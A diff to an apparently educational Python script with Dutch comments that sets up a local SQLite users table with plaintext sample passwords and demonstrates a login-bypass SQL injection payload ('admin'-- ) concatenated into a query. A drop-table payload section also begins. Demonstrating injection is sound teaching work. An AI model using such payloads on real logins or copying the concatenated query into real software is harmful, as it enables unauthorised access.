@@ -1,36 +1,35 @@
 import sqlite3
 
-con = sqlite3.connect('dev.db')
-cursor = con.cursor()
+con:sqlite3.Connection = sqlite3.connect('dev.db')
+cursor:sqlite3.Cursor = con.cursor()
 
 cursor.execute('DROP table gebruikers')
 # create gebruikers table
-command1 = """CREATE TABLE IF NOT EXISTS
+command1:str = """CREATE TABLE IF NOT EXISTS
 gebruikers(id INTEGER, naam TEXT, wachtwoord TEXT)"""
 cursor.execute(command1)
 
 # voeg sampel data toe aan database
-data = (1,'test_1','test_1')
+data:tuple = (1,'test_1','test_1')
 cursor.execute("INSERT INTO gebruikers VALUES(?,?,?)",data)
-data = (2,'test_2','test_2')
+data:tuple = (2,'test_2','test_2')
 cursor.execute("INSERT INTO gebruikers VALUES(?,?,?)",data)
-data = (3,'admin','root')
+data:tuple = (3,'admin','root')
 cursor.execute("INSERT INTO gebruikers VALUES(?,?,?)",data)
-data = (4,'jefke','patato')
+data:tuple = (4,'jefke','patato')
 cursor.execute("INSERT INTO gebruikers VALUES(?,?,?)",data)
 con.commit()
 
 # login bypass payload
 print('login bypass payload:')
-login_bypass_aanval = "'admin'-- "
+login_bypass_aanval:str = "'admin'-- "
 cursor.execute("SELECT * from gebruikers WHERE naam="+ login_bypass_aanval+" AND wachtwoord='dd'")
-results = cursor.fetchall()
+results:list = cursor.fetchall()
 print(results)
-results = results[0]
+results:tuple = results[0]
 print(results)
-results = results[1]
+results:str = results[1]
 print(results)
-
 
 # # drop table payload
 # cursor.execute("SELECT * FROM gebruikers")
